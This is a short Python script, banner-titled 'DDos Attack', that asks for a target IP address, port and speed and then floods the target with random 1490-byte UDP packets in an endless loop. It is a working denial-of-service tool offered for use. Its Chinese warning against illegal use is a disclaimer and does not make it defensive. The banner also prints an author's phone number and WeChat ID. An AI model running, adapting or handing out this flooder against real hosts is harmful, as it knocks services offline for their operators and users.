# python3

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print (" ")
print ("---------------------------------------------------")
print ("   BY          : 0kilobyte                        ")
print ("   TEL         :18763591626                       ")
print ("   WeChat      :tian18763591626                   ")
print ("---------------------------------------------------")
print (" ")
print (" -----------------严禁将其用于非法目的，否则后果自负!!!----------------- ")
print (" ")
ip = input("input attack IP     : ")
port = int(input("Attack port      : "))
sd = int(input("Attack speed(1~1000) : "))

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("send %s data %s to port %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)

